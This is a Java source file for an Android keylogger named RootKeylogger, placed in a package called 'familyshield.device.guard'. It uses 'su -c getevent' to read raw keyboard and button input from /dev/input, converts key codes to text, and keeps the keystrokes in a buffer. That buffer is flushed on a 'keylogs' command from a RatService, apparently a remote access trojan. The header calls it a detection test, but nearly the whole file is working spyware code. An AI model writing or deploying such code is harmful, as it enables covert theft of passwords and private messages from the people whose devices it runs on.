package com.familyshield.device.guard;

import android.util.Log;
import java.io.*;
import java.util.*;

/**
 * Root-level keylogger.
 *
 * Reads raw input events from /dev/input/event* via `su -c getevent` — a kernel-level
 * operation that any proper detection system should flag. On a rooted test phone this
 * captures physical keyboard input and hardware button presses.
 *
 * Soft-keyboard (IME) input is captured by KeylogService (accessibility) which runs
 * in parallel. Together they cover all input paths.
 *
 * Detection test signals generated by this class:
 *   1. `su` process spawn from a foreground service (privilege escalation attempt)
 *   2. /dev/input/event* open by a non-system UID (kernel audit rule trigger)
 *   3. Continuous read on input device nodes (unusual for user-space apps)
 */
public class RootKeylogger {

    private static final String TAG      = "RootKeylogger";
    private static final int    MAX_KEYS = 20_000;

    private static final StringBuilder keyBuffer = new StringBuilder();
    private static final Object        lock       = new Object();

    private static Thread   readerThread;
    private static volatile boolean running = false;

    // Android key-code-name → printable character map (subset covering typical typing)
    private static final Map<String, String> KEY_MAP = new HashMap<String, String>() {{
        // Letters
        for (char c = 'A'; c <= 'Z'; c++) put("KEY_" + c, String.valueOf(c).toLowerCase());
        // Numbers
        for (int i = 0; i <= 9; i++) put("KEY_" + i, String.valueOf(i));
        // Common punctuation
        put("KEY_SPACE", " "); put("KEY_ENTER", "\n"); put("KEY_TAB", "\t");
        put("KEY_BACKSPACE", "<BS>"); put("KEY_DELETE", "<DEL>");
        put("KEY_MINUS", "-"); put("KEY_EQUAL", "="); put("KEY_LEFTBRACE", "[");
        put("KEY_RIGHTBRACE", "]"); put("KEY_BACKSLASH", "\\"); put("KEY_SEMICOLON", ";");
        put("KEY_APOSTROPHE", "'"); put("KEY_GRAVE", "`"); put("KEY_COMMA", ",");
        put("KEY_DOT", "."); put("KEY_SLASH", "/");
    }};

    // ── public API ─────────────────────────────────────────────────────────────

    public static synchronized void start() {
        if (running) return;
        running = true;
        readerThread = new Thread(RootKeylogger::readLoop);
        readerThread.setDaemon(true);
        readerThread.setName("root-keylog");
        readerThread.start();
        Log.i(TAG, "root keylogger started");
    }

    public static synchronized void stop() {
        running = false;
        if (readerThread != null) readerThread.interrupt();
    }

    /** Retrieve and clear the buffer (called by RatService on `keylogs` command). */
    public static String flushLogs() {
        synchronized (lock) {
            String data = keyBuffer.toString();
            keyBuffer.setLength(0);
            return data;
        }
    }

    public static int bufferSize() {
        synchronized (lock) { return keyBuffer.length(); }
    }

    // ── internal ──────────────────────────────────────────────────────────────

    private static void readLoop() {
        // Probe all event devices to find which ones emit key events
        String targetDevice = findKeyboardDevice();

        // If probe found nothing, fall back to reading all devices
        String gevArgs = targetDevice != null
                ? "getevent -l " + targetDevice
                : "getevent -l";

        try {
            // This is the kernel-level operation: open /dev/input via su
            java.lang.Process su = Runtime.getRuntime().exec(new String[]{"su", "-c", gevArgs});
            BufferedReader br = new BufferedReader(new InputStreamReader(su.getInputStream()));

            append("[ROOT-KEYLOG START dev=" + (targetDevice != null ? targetDevice : "all") + "]\n");

            String line;
            while (running && (line = br.readLine()) != null) {
                // getevent -l output: "/dev/input/event3: EV_KEY  KEY_A  DOWN"
                if (line.contains("EV_KEY") && (line.contains(" DOWN") || line.contains("\tDOWN"))) {
                    String keyName = extractKeyName(line);
                    if (keyName != null) {
                        String ch = KEY_MAP.get(keyName);
                        append(ch != null ? ch : "<" + keyName + ">");
                    }
                }
            }
            su.destroy();
        } catch (IOException e) {
            append("[ROOT-KEYLOG ERROR: " + e.getMessage() + " -- su may not be available]\n");
            Log.w(TAG, "readLoop error: " + e.getMessage());
        }
    }

    private static String findKeyboardDevice() {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "getevent -p"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String currentDevice = null;
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith("add device")) {
                    // "add device 3: /dev/input/event3"
                    int colon = line.lastIndexOf(':');
                    if (colon >= 0) currentDevice = line.substring(colon + 1).trim();
                } else if (line.contains("KEY") && currentDevice != null) {
                    // Found a device that has KEY events — likely keyboard/touchscreen
                    // Prefer event devices that have a large key range (software keyboards)
                    p.destroy();
                    return currentDevice;
                }
            }
            p.destroy();
        } catch (Exception ignored) {}
        return null;
    }

    private static String extractKeyName(String line) {
        // Line format: "/dev/input/event3: EV_KEY       KEY_A                DOWN"
        // or with tabs. Find "KEY_" token.
        String[] parts = line.trim().split("\\s+");
        for (String p : parts) {
            if (p.startsWith("KEY_")) return p;
        }
        return null;
    }

    private static void append(String s) {
        synchronized (lock) {
            keyBuffer.append(s);
            if (keyBuffer.length() > MAX_KEYS) keyBuffer.delete(0, MAX_KEYS / 2);
        }
    }
}
